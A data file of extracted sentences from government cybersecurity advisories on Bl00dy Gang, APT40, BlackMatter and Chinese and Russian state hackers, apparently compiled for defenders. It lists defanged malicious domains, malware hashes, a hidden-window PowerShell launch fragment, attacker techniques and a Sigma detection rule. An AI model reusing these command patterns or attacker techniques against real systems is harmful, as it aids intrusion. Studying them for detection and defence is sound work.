CAND_00538,R011,10,R011_P0004,R011_S000105,Table 4: Bl00dy Gang Ransomware Domains Malicious Domain Description anydeskupdate[.]com N/A anydeskupdates[.]com N/A ber6vjyb[.]com Associated with TrueBot C2 netviewremote[.]com N/A study.abroad[.]ge Associated with Cobalt Strike Beacon upd343.winserverupdates[.]com Associated with Cobalt Strike Beacon upd488.windowservicecemter[.]com Associated with TrueBot payload upd488.windowservicecemter[.]com/download/update.dll File: Cobalt Strike Beacon updateservicecenter[.]com N/A windowcsupdates[.]com N/A windowservicecemter[.]com Associated with TrueBot payload windowservicecentar[.]com N/A windowservicecenter[.]com N/A winserverupdates[.]com N/A winserverupdates[.]com N/A
CAND_00539,R011,11,R011_P0002,R011_S000106,FBI  CISA Page 11 of 13 | Product ID: AA23-131A
CAND_00540,R011,11,R011_P0003,R011_S000107,TLP:CLEAR TLP:CLEAR Table 5: Bl00dy Gang Ransomware Known Commands Command Description cmd /c “powershell.exe -nop -w hidden Launches powershell.exe in a hidden window without loading the user's PowerShell profile.
CAND_00541,R011,11,R011_P0004,R011_S000110,Table 6: Bl00dy Gang Ransomware Malicious Files File SHA-256 Description /windows/system32/config/ systemprofile/appdata/roa ming/tor/ N/A Unspecified files created in Tor directory /windows/temp/ socks.exe 6bb160ebdc59395882ff 322e67e000a22a5c54a c777b6b1f10f1fef381df9 c15 Reverse SOCKS5 tunneler with TLS support (see https://github.com/kost/revsocks) /windows/temp/servers.txt N/A Unspecified content within servers.txt file; likely a list of proxy servers for revsocks(socks.exe) ld.txt c0f8aeeb2d11c6e751ee 87c40ee609aceb1c103 6706a5af0d3d78738b6c c4125 TrueBot malware nethelper.exe N/A Unknown file used to send outbound communications through Tor update.dll 0ce7c6369c024d49785 1a482e011ef1528ad270 e83995d52213276edbe 71403f Cobalt Strike Beacon
CAND_00542,R011,12,R011_P0003,R011_S000113,Create a backup of the current PaperCut server(s).
CAND_00543,R011,12,R011_P0003,R011_S000116,3.
CAND_00544,R011,12,R011_P0003,R011_S000119,4.
CAND_00545,R011,12,R011_P0003,R011_S000121,5.
CAND_00546,R011,12,R011_P0003,R011_S000123,The FBI encourages recipients of this document to report information concerning suspicious or criminal activity to their local FBI field office or IC3.gov.
CAND_00547,R011,12,R011_P0003,R011_S000126,MITIGATIONS FBI and CISA recommend organizations: • Upgrade PaperCut to the latest version.
CAND_00548,R011,12,R011_P0003,R011_S000127,"• If unable to immediately patch, ensure vulnerable PaperCut servers are not accessible over the internet and implement one of the following network controls: o Option 1: External controls: Block all inbound traffic from external IP addresses to the web management portal (port 9191 and 9192 by default)."
CAND_00549,R011,12,R011_P0003,R011_S000134,ACKNOWLEDGMENTS The Multi-State Information Sharing and Analysis Center (MS-ISAC) contributed to this advisory.
CAND_00550,R011,12,R011_P0003,R011_S000135,REFERENCES [1] PaperCut: URGENT | PaperCut MF/NG vulnerability bulletin (March 2023)
CAND_00551,R012,5,R012_P0002,R012_S000024,APT40 continues to find success exploiting vulnerabilities from as early as 2017.
CAND_00552,R012,5,R012_P0002,R012_S000027,APT40 Advisory – PRC MSS tradecraft in action 5
CAND_00553,R012,7,R012_P0001,R012_S000045,Case studies ASD’s ACSC are sharing two anonymised investigative reports to provide awareness of how the actors employ their tools and tradecraft.
CAND_00554,R012,7,R012_P0001,R012_S000046,MD5 Filename Additional information 26a5a7e71a601be991073c78d513dee3 horizon.jsp 1 kB | Java Source 87c88f06a7464db2534bc78ec2b915de Index_jsp$ProxyEndpoint$Attach.class 597 B | Java Bytecode 6a9bc68c9bc5cefaf1880ae6ffb1d0ca Index_jsp.class 5 kB | Java Bytecode 64454645a9a21510226ab29e01e76d39 Index_jsp.java 5 kB | Java Source e2175f91ce3da2e8d46b0639e941e13f Index_jsp$ProxyEndpoint.class 4 kB | Java Bytecode 9f89f069466b8b5c9bf25c9374a4daf8 Index_jsp$ProxyEndpoint$1.class 3 kB | Java Bytecode 187d6f2ed2c80f805461d9119a5878ac Index_jsp$ProxyEndpoint$2.class 1 kB | Java Bytecode ed7178cec90ed21644e669378b3a97ec Nova_jsp.class 7 kB | Java Bytecode 5bf7560d0a638e34035f85cd3788e258 Nova_jsp$TomcatListenerMemShellFromThread.
CAND_00555,R012,8,R012_P0001,R012_S000052,This investigative report was provided to the organisation to summarise observed malicious activity and frame remediation recommendations.
CAND_00556,R012,9,R012_P0001,R012_S000064,"Investigation findings In mid-August 2022, the ASD’s ACSC notified the organisation that a confirmed malicious IP believed to be affiliated with a state-sponsored cyber group had interacted with the organisation's computer networks between at least July and August."
CAND_00557,R012,9,R012_P0001,R012_S000069,"In September, after consultation with the ASD’s ACSC, the organisation decided to denylist the IP identified in the initial notification."
CAND_00558,R012,9,R012_P0001,R012_S000074,The actor carried out a Kerberoasting attack in order to obtain valid network credentials from a server (T1558.003).
CAND_00559,R012,10,R012_P0001,R012_S000078,Detailed timeline July: The actors established an initial connection to the front page of a custom web application (T1190) built for the organisation (hereafter referred to as the ‘web application’ or ‘webapp’) via a transport layer security (TLS) connection (T1102).
CAND_00560,R012,10,R012_P0001,R012_S000082,"July: The actors are able to successfully POST to the web server, probably via a web shell placed on another page."
CAND_00561,R012,10,R012_P0001,R012_S000085,"The exact method of exploitation is unknown, but it is clear that the specific endpoint was targeted to create files on <webapp>2-ext."
CAND_00562,R012,10,R012_P0003,R012_S000095,"In a Microsoft corporate domain, there are various kinds of accounts."
CAND_00563,R012,10,R012_P0004,R012_S000097,Mounting shares is the process of making files on a file system structure accessible to a user or user group.
CAND_00564,R012,10,R012_P0004,R012_S000098,"July: The actors deploy the open-source tool Secure Socket Funnelling, which was used to connect out to the malicious infrastructure."
CAND_00565,R012,10,R012_P0004,R012_S000105,August – September: The SSF tool re-established a connection to a malicious IP.
CAND_00566,R012,11,R012_P0001,R012_S000109,Actor tactics and techniques The MITRE ATT&CK framework is a documented collection of tactics and techniques employed by threat actors in cyberspace.
CAND_00567,R012,11,R012_P0001,R012_S000112,Initial access T1190 – Exploit Public-Facing Application (regarding exploiting the custom web application) T1078.002 – Valid Accounts: Domain Accounts (regarding logging on with comprised credentials) Exploiting internet-exposed custom web applications provided an initial point of access for the actor.
CAND_00568,R012,12,R012_P0001,R012_S000120,The findings indicate the compromise was undertaken by APT40.
CAND_00569,R012,12,R012_P0001,R012_S000123,This server used a remote access login and identity management product and will be referred to in this report as 'the compromised appliance'.
CAND_00570,R012,12,R012_P0001,R012_S000128,"Upon a review by the organisation, the passwords were found to be legitimate."
CAND_00571,R012,12,R012_P0001,R012_S000129,"The ASD’s ACSC assesses that the actor may have collected these technical artefacts to hijack or create a remote login session as a legitimate user, and access the organisation's internal corporate network using a legitimate user account."
CAND_00572,R012,13,R012_P0001,R012_S000138,Threat actors from the group are assessed to have attained escalated privileges on the appliance.
CAND_00573,R012,13,R012_P0001,R012_S000139,The ASD’s ACSC could not determine the full extent of the activity due to lack of logging availability.
CAND_00574,R012,13,R012_P0001,R012_S000142,"The artefacts exfiltrated by the actor may have allowed them to hijack or initiate virtual desktop sessions as a legitimate user, possibly as a user of their choice, including administrators."
CAND_00575,R012,13,R012_P0001,R012_S000144,Other organisation appliances within the hosting provider managed environment did not show evidence of compromise.
CAND_00576,R012,13,R012_P0001,R012_S000146,"Location Compromised appliance hostnames (load-balanced) Datacentre 1 HOST1, HOST2, HOST3 The appliance infrastructure also included access gateway hosts that provide a tunnel to the VDI for the user, once they possess an authentication token generated and downloaded from the appliance."
CAND_00577,R012,14,R012_P0001,R012_S000160,"As described above, this may indicate that malicious cyber actors impacted or utilised this device, potentially to pivot into the internal network."
CAND_00578,R012,14,R012_P0001,R012_S000168,Evidence available on HOST1 suggests that the password for user ‘sshuser’ was changed.
CAND_00579,R012,14,R012_P0001,R012_S000175,HOST3 was shut down by the organisation.
CAND_00580,R012,14,R012_P0001,R012_S000182,An authentication event for a user is linked to a known malicious IP address in logs on HOST1.
CAND_00581,R012,14,R012_P0001,R012_S000193,The ports were 9998 and 9999 (T1572).
CAND_00582,R012,15,R012_P0001,R012_S000202,Web shells would have allowed for arbitrary command execution by the actor on the compromised appliances.
CAND_00583,R012,15,R012_P0001,R012_S000210,There is no evidence of compromise of the ‘secret server’ which stores the unique values that provide for the security of MFA tokens.
CAND_00584,R012,15,R012_P0001,R012_S000214,These could have been reused by the actor to establish further access.
CAND_00585,R012,16,R012_P0001,R012_S000218,Collection Available evidence does not reveal how actors collected data or exactly what was collected from the compromised appliance or from other systems.
CAND_00586,R012,16,R012_P0001,R012_S000223,APT40 Advisory – PRC MSS tradecraft in action 16
CAND_00587,R012,17,R012_P0001,R012_S000225,"Below are recommendations for network security actions that should be taken to detect and prevent intrusions by APT40, followed by specific mitigations for four key TTPs summarised in Table 1."
CAND_00588,R012,17,R012_P0001,R012_S000234,Removing applications executed by the SYSTEM or NETWORK SERVICE users substantially reduces the quantity of benign activity selected by this rule.
CAND_00589,R012,17,R012_P0001,R012_S000237,"Examine information directly associated with this file execution, such as the user context, execution integrity level, immediate follow-on activity and images loaded by the file."
CAND_00590,R012,17,R012_P0001,R012_S000242,References: https://www.elastic.co/guide/en/security/current/ process-execution-from-an-unusual-directory.html Author: ASD's ACSC Date: 2024/06/19 Status: experimental Tags: - tlp.green - classification.au.official - attack.execution Log Source:  category: process_creation  product: windows Detection:  temp:  Image|startswith: 'C:\\Windows\\Temp\\'  common_temp_path:  Image|re|ignorecase: 'C:\\Windows\\Temp\\\ {[a-fA-F0-9]{8}-([a-fA-F0-9]{4}-){3}[a-fA-F0-9] {12}\}\\'  system_user:  User: - 'SYSTEM' - 'NETWORK SERVICE'  APT40 Advisory – PRC MSS tradecraft in action 17
CAND_00591,R012,18,R012_P0001,R012_S000244,"- Temp will legitimately contain an array of setup applications and launchers, so it will be worth considering how prevalent this behaviour is on a monitored network (and whether or not it can be allowlisted) before deploying this rule."
CAND_00592,R012,18,R012_P0001,R012_S000249,Investigation: 1.
CAND_00593,R012,18,R012_P0001,R012_S000250,"Examine information directly associated with this file execution, such as the user context, execution integrity level, immediate follow-on activity and images loaded by the file."
CAND_00594,R012,18,R012_P0001,R012_S000253,3.
CAND_00595,R012,19,R012_P0001,R012_S000257,It is plausible that scripts and administrative tools used in the monitored environment(s) may be located in one of these directories and should be addressed on a case-by-case basis.
CAND_00596,R012,20,R012_P0001,R012_S000268,"Level: medium Mitigations Logging During ASD’s ACSC investigations, a common issue that reduces the effectiveness and speed of investigative efforts is a lack of comprehensive and historical logging information across a number of areas including web server request logs, Windows event logs and internet proxy logs."
CAND_00597,R012,21,R012_P0001,R012_S000291,"Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the authoring agencies."
CAND_00598,R012,27,R012_P0001,R012_S000302,Notes APT40 Advisory – PRC MSS tradecraft in action 27
CAND_00599,R012,28,R012_P0001,R012_S000304,"In any important matter, you should seek appropriate independent professional advice in relation to your own circumstances."
CAND_00600,R012,28,R012_P0001,R012_S000308,"For the avoidance of doubt, this means this licence only applies to material as set out in this document."
CAND_00601,R013,1,R013_P0003,R013_S000003,Recipients may share this information without restriction.
CAND_00602,R013,1,R013_P0005,R013_S000007,"Countering Chinese State-Sponsored Actors Compromise of Networks Worldwide to Feed Global Espionage System Executive summary People’s Republic of China (PRC) state-sponsored cyber threat actors are targeting networks globally, including, but not limited to, telecommunications, government, transportation, lodging, and military infrastructure networks."
CAND_00603,R013,1,R013_P0005,R013_S000011,The authoring agencies are not adopting a particular commercial naming convention and hereafter refer to those responsible for
CAND_00604,R013,4,R013_P0002,R013_S000025,1.1 4 Countering Chinese State-Sponsored Actors Compromise of Networks Worldwide to Feed Global Espionage System Table of Contents Executive summary ....................................................................................................................
CAND_00605,R013,4,R013_P0002,R013_S000026,1 Background ................................................................................................................................
CAND_00606,R013,5,R013_P0002,R013_S000035,Ltd.
CAND_00607,R013,6,R013_P0002,R013_S000046,1.1 6 Countering Chinese State-Sponsored Actors Compromise of Networks Worldwide to Feed Global Espionage System Technical details The following sections are a compilation of TTPs the APT actors have used since at least 2021 to target enterprise environments.
CAND_00608,R013,7,R013_P0002,R013_S000066,This can help distinguish between vulnerable and remediated systems when analyzing logs or captures.
CAND_00609,R013,7,R013_P0002,R013_S000070,"The actors leverage compromised devices and trusted connections or private interconnections (e.g., provider-to-provider or provider-to-customer links) to pivot into other networks [T1199]."
CAND_00610,R013,8,R013_P0002,R013_S000080,This alteration allows the actors to bypass security policies and maintain ongoing access by explicitly permitting traffic from a threat actor-controlled IP address [T1562.004].
CAND_00611,R013,8,R013_P0002,R013_S000082,"When 20 was already used, the actors commonly used 50 or 10."
CAND_00612,R013,9,R013_P0002,R013_S000093,"If the web UI feature is enabled on Cisco IOS XE Software, this vulnerability provides an entry opportunity for the APT actors."
CAND_00613,R013,10,R013_P0002,R013_S000115,"On platforms without a dedicated management port, connectivity can be provided with a VirtualPortGroup interface."
CAND_00614,R013,12,R013_P0002,R013_S000148,"These requests typically target privileged execution paths, such as /level/15/exec/-/*, and may include instructions to display configuration files, access BGP routes, manage VRF instances, or clear system logs [T1082]."
CAND_00615,R013,13,R013_P0002,R013_S000155,TLP:CLEAR TLP:CLEAR U/OO/198904-25 | PP-25-3703 | September 2025 Ver.
CAND_00616,R013,14,R013_P0003,R013_S000178,"On IOS XR, sshd_operns is disabled by default and must be explicitly started (e.g., service sshd_operns start)."
CAND_00617,R013,15,R013_P0002,R013_S000184,"If malicious activity is suspected or confirmed, organizations should consider all mandatory reporting requirements to relevant agencies and regulators under applicable laws and regulations, and any additional voluntary reporting to appropriate agencies, such as cybersecurity or law enforcement agencies who can provide incident response guidance and assistance with mitigation."
CAND_00618,R013,15,R013_P0002,R013_S000190,Incident response on one network may also result in the APT actors taking measures to
CAND_00619,R013,16,R013_P0002,R013_S000194,Organizations should take steps to protect the details of their threat hunting and incident response from APT actor monitoring activities.
CAND_00620,R013,16,R013_P0002,R013_S000207,"On NX-OS, hunt for guestshell enable, run guestshell, and guestshell destroy."
CAND_00621,R013,17,R013_P0002,R013_S000211, Hunt for actor-favored protocol patterns:  SSH on high non-default ports with 22x22/xxx22 numbering patterns from non-admin source IPs.
CAND_00622,R013,17,R013_P0002,R013_S000216,Any inbound TCP/57722 should be treated as high-risk if unexpected.
CAND_00623,R013,18,R013_P0002,R013_S000232,Alert on any boot-time or run-time verification failure.
CAND_00624,R013,18,R013_P0002,R013_S000238,(SPAN/ERSPAN) and PCAP state.
CAND_00625,R013,18,R013_P0002,R013_S000242,"Where supported, ensure the host operating system (OS) sshd_operns service is disabled and not listening."
CAND_00626,R013,19,R013_P0002,R013_S000251,Indicators of compromise IP-based indicators The following IP indicators were associated with the APT actors’ activity from August 2021 to June 2025.
CAND_00627,R013,20,R013_P0003,R013_S000258,The following SFTP client binaries in Table 4 through Table 7 are similar in that they are used to transfer files from a compromised network to staging hosts where the files are prepared for exfiltration.
CAND_00628,R013,23,R013_P0002,R013_S000271,TLP:CLEAR TLP:CLEAR U/OO/198904-25 | PP-25-3703 | September 2025 Ver.
CAND_00629,R013,24,R013_P0002,R013_S000300,Disable password authentication where operationally feasible.
CAND_00630,R013,24,R013_P0002,R013_S000306, Ensure this management VRF has no route leakage to customers or peering VRFs and cannot initiate or receive sessions from data-plane or peering address space [D3-ITF].
CAND_00631,R013,25,R013_P0002,R013_S000312," Apply these restrictions to all SNMP, TACACS+/RADIUS (TCP/UDP 49/1812/1813), HTTPS (TCP/443 and any configured non-default port), SSH (TCP/22 and any configured non-default port), and SFTP/SCP."
CAND_00632,R013,26,R013_P0002,R013_S000347, Enable TTL security (GTSM) or equivalent for eBGP to reduce off-path attack surface.
CAND_00633,R013,26,R013_P0002,R013_S000348," Require session protection (TCP-AO where supported, otherwise MD5) and monitor for BGP session resets and parameter changes from unexpected management origins."
CAND_00634,R013,27,R013_P0002,R013_S000355, Protect local credentials on Cisco networking devices using Type 8 (PBKDF2-SHA-256) where supported.
CAND_00635,R013,27,R013_P0002,R013_S000357," Use Type 6 (AES) key encryption to protect stored secrets (e.g., TACACS+/RADIUS shared secrets or IKE PSKs)."
CAND_00636,R013,27,R013_P0002,R013_S000361, Audit for unexpected enablement of IOS XR host SSH (sshd_operns) on TCP/57722.
CAND_00637,R013,27,R013_P0002,R013_S000364," If management via a web interface is required, ensure to enable only the HTTPS management interface by running the command ip http secure-server and keep no ip http server configured to prevent unencrypted access via HTTP."
CAND_00638,R013,27,R013_P0002,R013_S000367,Mitigating Guest Shell abuse  Disable Guest Shell where not operationally required.
CAND_00639,R013,28,R013_P0002,R013_S000373,Use guestshell destroy to uninstall it and return resources to the system.
CAND_00640,R013,28,R013_P0002,R013_S000378,Device syslog does not capture process activity inside the container by default.
CAND_00641,R013,28,R013_P0002,R013_S000382, Create alerts for guestshell disable / guestshell destroy and unexpected chvrf / dohost usage.
CAND_00642,R013,28,R013_P0002,R013_S000383,"Consider Cisco Embedded Event Manager (EEM) policies that snapshot state (running processes, container filesystem, storage listings) when these events occur."
CAND_00643,R013,28,R013_P0002,R013_S000384,Additional Cisco resources:  Cisco Software Checker: Resource to find if any known vulnerabilities affect a version of IOS that may be currently in use.
CAND_00644,R013,30,R013_P0002,R013_S000393,TLP:CLEAR TLP:CLEAR U/OO/198904-25 | PP-25-3703 | September 2025 Ver.
CAND_00645,R013,31,R013_P0002,R013_S000407, Department of Defense Cyber Crime Center (DC3) Defense Industrial Base Inquiries and Cybersecurity Services: DC3.DCISE@us.af.mil Media Inquiries / Press Desk: DC3.Information@us.af.mil Australian organizations  Visit cyber.gov.au or call 1300 292 371 (1300 CYBER 1) to report cybersecurity incidents and access alerts and advisories.
CAND_00646,R013,31,R013_P0002,R013_S000408,Canadian organizations  Report incidents by emailing CCCS at contact@cyber.gc.ca.
CAND_00647,R013,31,R013_P0002,R013_S000413,"Guidance and contact information on standards, specifications, and other requirements for the UK telecoms industry can be found at https://www.ofcom.org.uk."
CAND_00648,R013,31,R013_P0002,R013_S000414,For general inquiries: networksecurityenquiries@ofcom.org.uk For incident reports: incident@ofcom.org.uk Czech Republic organizations  National Cyber and Information Security Agency (NÚKIB): cert.incident@nukib.gov.cz.
CAND_00649,R013,32,R013_P0002,R013_S000417,"1.1 32 Countering Chinese State-Sponsored Actors Compromise of Networks Worldwide to Feed Global Espionage System  BfV Prevention/Economic Protection Unit: +49 30 18792-3322, wirtschaftsschutz@bfv.bund.de  BSI Service-Center: +49 800 274 1000, service-center@bsi.bund.de Italian organizations  Italian External Intelligence and Security Agency (AISE): Visit https://www.sicurezzanazionale.gov.it/chi-siamo/organizzazione/aise."
CAND_00650,R013,36,R013_P0002,R013_S000429,"1.1 36 Countering Chinese State-Sponsored Actors Compromise of Networks Worldwide to Feed Global Espionage System Data from Configuration Repository: Network Device Configuration Dump T1602.002 Acquire credentials by collecting network device configurations Data from Local System T1005 Passively collect PCAP from specific ISP customer networks Table 19: Command and Control Technique Title ID Use Proxy T1090 Use VPS for C2 Proxy: Multi-hop Proxy T1090.003 Leverage open source multi-hop pivoting tools, such as STOWAWAY, to build chained relays for command and control and operator access Application Layer Protocol T1071 Open and expose a variety of different services (e.g., Secure Shell [SSH], Secure File Transfer Protocol [SFTP], Remote Desktop Protocol [RDP], File Transfer Protocol [FTP], HTTP, HTTPS) Non-Standard Port T1571 Utilize non-standard ports to evade detection by security monitoring tools that focus on standard port activity Protocol Tunneling T1572 Create tunnels over protocols such as GRE, mGRE, or IPsec on network devices Non-Application Layer Protocol T1095 Use GRE/IPsec to carry C2 over non- application layer protocols Table 20: Exfiltration Technique Title ID Use Exfiltration over Alternative Protocol T1048.003 Use tunnels, such as IPsec and GRE, to conduct C2 and exfiltration activities"
CAND_00651,R014,1,R014_P0002,R014_S000001,Product ID: AA21-291A
CAND_00652,R014,1,R014_P0003,R014_S000002,"TLP:WHITE Co-Authored by: October 18, 2021 0"
CAND_00653,R014,1,R014_P0004,R014_S000005,Cybersecurity_Requests@nsa.gov.
CAND_00654,R014,1,R014_P0005,R014_S000007,"TLP:WHITE BlackMatter Ransomware SUMMARY This joint Cybersecurity Advisory was developed by the Cybersecurity and Infrastructure Security Agency (CISA), the Federal Bureau of Investigation (FBI), and the National Security Agency (NSA) to provide information on BlackMatter ransomware."
CAND_00655,R014,1,R014_P0005,R014_S000010,Food and Agriculture Sector organizations.
CAND_00656,R014,1,R014_P0005,R014_S000012,"Using embedded, previously compromised credentials, BlackMatter leverages the Lightweight Directory Access Protocol (LDAP) and Server Message Block (SMB) protocol to access the Active Directory (AD) to discover all hosts on the network."
CAND_00657,R014,1,R014_P0005,R014_S000015,These mitigations will help organizations reduce the risk of compromise from BlackMatter ransomware attacks.
CAND_00658,R014,1,R014_P0005,R014_S000017,"• Use strong, unique passwords."
CAND_00659,R014,1,R014_P0005,R014_S000019,• Implement network segmentation and traversal monitoring.
CAND_00660,R014,1,R014_P0005,R014_S000021,"For NSA client requirements or general cybersecurity inquiries, contact the NSA Cybersecurity Requirements Center at 410-854-4200 or This document was developed by CISA, the FBI, and NSA in furtherance of their respective cybersecurity missions, including their responsibilities to develop and issue cybersecurity specifications and mitigations."
CAND_00661,R014,1,R014_P0005,R014_S000023,Disclosure is not limited.
CAND_00662,R014,2,R014_P0002,R014_S000027,"CISA | FBI | NSA Page 2 of 7 | Product ID: AA21-291A TLP: WHITE TLP:WHITE TECHNICAL DETAILS Overview First seen in July 2021, BlackMatter is ransomware-as-a-service (Raas) tool that allows the ransomware’s developers to profit from cybercriminal affiliates (i.e., BlackMatter actors) who deploy it against victims."
CAND_00663,R014,2,R014_P0002,R014_S000028,"BlackMatter is a possible rebrand of DarkSide, a RaaS which was active from September 2020 through May 2021."
CAND_00664,R014,2,R014_P0002,R014_S000031,"(Note: click here to see the sample’s page on VirusTotal.) The BlackMatter variant uses embedded admin or user credentials that were previously compromised and NtQuerySystemInformation and EnumServicesStatusExW to enumerate running processes and services, respectively."
CAND_00665,R014,2,R014_P0002,R014_S000032,BlackMatter then uses the embedded credentials in the LDAP and SMB protocol to discover all hosts in the AD and the srvsvc.NetShareEnumAll Microsoft Remote Procedure Call (MSRPC) function to enumerate each host for accessible shares.
CAND_00666,R014,2,R014_P0002,R014_S000037,"Table 1: BlackMatter Actors and Ransomware TTPs Tactic Technique Procedure Persistence [TA0003] External Remote Services [T1133] BlackMatter leverages legitimate remote monitoring and management software and remote desktop software, often by setting up trial accounts, to maintain persistence on victim networks."
CAND_00667,R014,2,R014_P0002,R014_S000039,See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques.
CAND_00668,R014,3,R014_P0002,R014_S000041,Discovery [TA0007] Remote System Discovery [T1018] BlackMatter leverages LDAP and SMB protocol to discover all hosts in the AD.
CAND_00669,R014,3,R014_P0002,R014_S000044,"Lateral Movement [TA0008] Remote Services: SMB/Windows Admin Shares [T1021.002] BlackMatter uses srvsvc.NetShareEnumAll MSRPC function to enumerate and SMB to connect to all discovered shares, including ADMIN$, C$, SYSVOL, and NETLOGON."
CAND_00670,R014,3,R014_P0002,R014_S000045,Exfiltration [TA0010] Exfiltration Over Web Service [T1567] BlackMatter attempts to exfiltrate data for extortion.
CAND_00671,R014,3,R014_P0002,R014_S000046,Impact [TA0040] Data Encrypted for Impact [T1486] BlackMatter remotely encrypts shares via SMB protocol and drops a ransomware note in each directory.
CAND_00672,R014,3,R014_P0002,R014_S000047,Disk Wipe [T1561] BlackMatter may wipe backup systems.
CAND_00673,R014,3,R014_P0003,R014_S000048,DETECTION SIGNATURES The following Snort signatures may be used for detecting network activity associated with BlackMatter activity.
CAND_00674,R014,4,R014_P0002,R014_S000055,"Implement Multi-Factor Authentication • Require multi-factor authentication for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems."
CAND_00675,R014,4,R014_P0002,R014_S000056,Patch and Update Systems • Keep all operating systems and software up to date.
CAND_00676,R014,4,R014_P0002,R014_S000057,Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats.
CAND_00677,R014,4,R014_P0002,R014_S000059,"If ADMIN$ and C$ are deemed operationally necessary, restrict privileges to only the necessary service or user accounts and perform continuous monitoring for anomalous activity."
CAND_00678,R014,4,R014_P0002,R014_S000060,• Use a host-based firewall to only allow connections to administrative shares via SMB from a limited set of administrator machines.
CAND_00679,R014,4,R014_P0002,R014_S000061,Implement Network Segmentation and Traversal Monitoring Adversaries use system and network discovery techniques for network and system visibility and mapping.
CAND_00680,R014,4,R014_P0002,R014_S000063,• Segment networks to prevent the spread of ransomware.
CAND_00681,R014,4,R014_P0002,R014_S000064,Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to— various subnetworks and by restricting adversary lateral movement.
CAND_00682,R014,5,R014_P0002,R014_S000067,Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.
CAND_00683,R014,5,R014_P0002,R014_S000071,This is a process where a network-wide policy is set in place to automatically disable admin accounts at the AD level when the account is not in direct need.
CAND_00684,R014,5,R014_P0002,R014_S000075,"If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally."
CAND_00685,R014,5,R014_P0002,R014_S000077,"This practice will ensure the organization will not be severely interrupted, have irretrievable data, or be held up by a ransom demand."
CAND_00686,R014,5,R014_P0002,R014_S000079,"CISA, the FBI, and NSA urge critical infrastructure organizations to apply the following additional mitigations to reduce the risk of credential compromise."
CAND_00687,R014,5,R014_P0002,R014_S000081,• Consider disabling or limiting New Technology Local Area Network Manager (NTLM) and WDigest Authentication.
CAND_00688,R014,5,R014_P0002,R014_S000082,• Implement Credential Guard for Windows 10 and Server 2016 (Refer to Microsoft: Manage Windows Defender Credential Guard for more information).
CAND_00689,R014,5,R014_P0002,R014_S000083,"For Windows Server 2012R2, enable Protected Process Light for Local Security Authority (LSA)."
CAND_00690,R014,5,R014_P0002,R014_S000084,• Minimize the AD attack surface to reduce malicious ticket-granting activity.
CAND_00691,R014,5,R014_P0002,R014_S000085,Malicious activity such as “Kerberoasting” takes advantage of Kerberos’ Ticket Granting service and can be used to obtain hashed credentials that attackers attempt to crack.
CAND_00692,R014,6,R014_P0002,R014_S000088,Refer to the CISA-Multi-State information and Sharing Center (MS-ISAC) Joint Ransomware Guide for general mitigations to prepare for and reduce the risk of compromise by ransomware attacks.
CAND_00693,R014,6,R014_P0002,R014_S000089,"Note: critical infrastructure organizations with industrial control systems/operational technology networks should review joint CISA-FBI Cybersecurity Advisory AA21-131A: DarkSide Ransomware: Best Practices for Preventing Business Disruption from Ransomware Attacks for more mitigations, including mitigations to reduce the risk of severe business or functional degradation should their entity fall victim to a ransomware attack."
CAND_00694,R014,6,R014_P0002,R014_S000090,"RESPONDING TO RANSOMWARE ATTACKS If a ransomware incident occurs at your organization, CISA, the FBI, and NSA recommend: • Following the Ransomware Response Checklist on p."
CAND_00695,R014,6,R014_P0002,R014_S000094,"• Reporting incidents immediately to the FBI at a local FBI Field Office, CISA at us- cert.cisa.gov/report, or the U.S."
CAND_00696,R014,6,R014_P0002,R014_S000095,Secret Service at a U.S.
CAND_00697,R014,6,R014_P0002,R014_S000102,• CISA’s Ransomware Readiness Assessment (RRA) is a no-cost self-assessment based on a tiered set of practices to help organizations better assess how well they are equipped to defend and recover from a ransomware incident.
CAND_00698,R014,6,R014_P0002,R014_S000103,"• CISA offers a range of no-cost cyber hygiene services to help critical infrastructure organizations assess, identify, and reduce their exposure to threats, including ransomware."
CAND_00699,R014,7,R014_P0002,R014_S000105,CISA | FBI | NSA Page 7 of 7 | Product ID: AA21-291A TLP: WHITE TLP:WHITE
CAND_00700,R014,7,R014_P0003,R014_S000107,"CISA, the FBI, and NSA do not endorse any commercial product or service, including any subjects of analysis."
CAND_00701,R015,1,R015_P0002,R015_S000004,"For NSA client requirements or general cybersecurity inquiries, contact the Cybersecurity Requirements Center at 410-854-4200 or Cybersecurity_Requests@nsa.gov."
CAND_00702,R015,1,R015_P0002,R015_S000015,"Additionally, CISA, the FBI, and NSA strongly urge network defenders to implement the recommendations listed below and detailed in the Mitigations section."
CAND_00703,R015,1,R015_P0002,R015_S000018,• Patch all systems.
CAND_00704,R015,1,R015_P0002,R015_S000022,• Develop internal contact lists and surge support.
CAND_00705,R015,2,R015_P0003,R015_S000026,Confirm reporting processes and minimize personnel gaps in IT/OT security coverage.
CAND_00706,R015,2,R015_P0003,R015_S000027,"Create, maintain, and exercise a cyber incident response plan, resilience plan, and continuity of operations plan so that critical functions and operations can be kept running if technology systems are disrupted or need to be taken offline."
CAND_00707,R015,2,R015_P0003,R015_S000030,"Follow best practices for identity and access management, protective controls and architecture, and vulnerability and configuration management."
CAND_00708,R015,2,R015_P0003,R015_S000035,"CISA, the FBI, and NSA encourage critical infrastructure organization leaders to review CISA Insights: Preparing for and Mitigating Cyber Threats for information on reducing cyber threats to their organization."
CAND_00709,R015,2,R015_P0003,R015_S000040,"The actors have also demonstrated the ability to maintain persistent, undetected, long-term access in compromised environments—including cloud environments—by using legitimate credentials."
CAND_00710,R015,3,R015_P0003,R015_S000048,The actors successfully compromised networks and exfiltrated data from multiple victims.
CAND_00711,R015,3,R015_P0003,R015_S000050,These Russian state-sponsored APT actors conducted a multi-stage intrusion campaign in which they gained remote access to U.S.
CAND_00712,R015,3,R015_P0003,R015_S000055,"In 2016, these actors conducted a cyber-intrusion campaign against a Ukrainian electrical transmission company and deployed CrashOverride malware specifically designed to attack power grids."
CAND_00713,R015,4,R015_P0003,R015_S000061,Note: these lists are not intended to be all inclusive.
CAND_00714,R015,4,R015_P0009,R015_S000070,"Russian state-sponsored APT actors use publicly known vulnerabilities, as well as zero-days, in internet-facing systems to gain access to networks."
CAND_00715,R015,4,R015_P0009,R015_S000072,Notable incidents include M.E.Doc accounting software and SolarWinds Orion.
